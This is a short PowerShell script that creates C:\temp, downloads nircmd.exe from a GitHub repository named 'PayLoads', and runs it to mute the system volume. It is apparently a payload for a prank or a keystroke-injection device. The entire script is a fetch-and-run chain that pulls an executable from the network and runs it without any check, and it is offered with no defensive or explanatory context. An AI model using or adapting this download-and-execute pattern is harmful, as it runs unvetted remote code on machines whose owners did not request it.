New-Item -ItemType Directory -Path "C:\temp"

$url = "https://github.com/philcharlesjackson/PayLoads/raw/main/nircmd.exe"
$output = "C:\temp\nircmd.exe"
Invoke-WebRequest -Uri $url -OutFile $output

C:\temp\nircmd.exe mutesysvolume 1